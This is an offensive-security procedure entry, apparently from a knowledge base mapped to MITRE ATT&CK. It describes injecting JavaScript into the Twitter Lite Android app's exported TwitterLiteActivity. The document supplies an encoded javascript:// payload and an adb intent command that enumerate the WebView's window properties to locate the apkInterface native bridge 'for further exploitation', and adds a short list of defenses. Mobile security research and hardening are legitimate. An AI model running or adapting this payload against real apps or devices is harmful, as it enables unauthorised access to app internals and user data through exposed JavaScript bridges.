---
tags:
  - android
  - javascript-injection
  - discovery
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/adb-enumerate-window-properties-in-twitterlite]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:34.636Z'
sub_techniques: []
id: dd781704-e8cb-42b8-a923-bb1c587091e2
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Enumerate Window Properties via JavaScript Injection in TwitterLiteActivity

## Summary

This procedure uses JavaScript injection to enumerate all properties on the window object in the Twitter Lite WebView, revealing exposed interfaces like apkInterface for further exploitation.

## Description

After basic JS injection, craft a payload using Object.getOwnPropertyNames to iterate and log window properties. The exported activity loads this via javascript://, allowing discovery of app-specific JS bridges to native Android code.

## Requirements

1. Successful JS injection setup
2. ADB access
3. Encoded JS payload handling

## Defense

Defensive measures and detection strategies:

- Minimize exposed window properties by not adding unnecessary JS interfaces
- Use addJavascriptInterface sparingly and with @JavascriptInterface annotations
- Detect anomalous JS execution via WebView logging

## Objectives

1. Identify internal app JavaScript interfaces
2. Discover methods for data access
3. Enable targeted exploitation

## Instructions

### Step 1: Encode Enumeration Payload

**Context**: Create JS to loop through window properties.

Payload: javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B

### Step 2: Execute Enumeration

**Context**: Inject the payload via intent.

**Command** ([[commands/adb-enumerate-window-properties-in-twitterlite]]):
```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"
```

> JS runs and writes properties to the document.

**Expected Output**: List including 'apkInterface'.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/adb-enumerate-window-properties-in-twitterlite]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- javascript-injection
- discovery
- webview
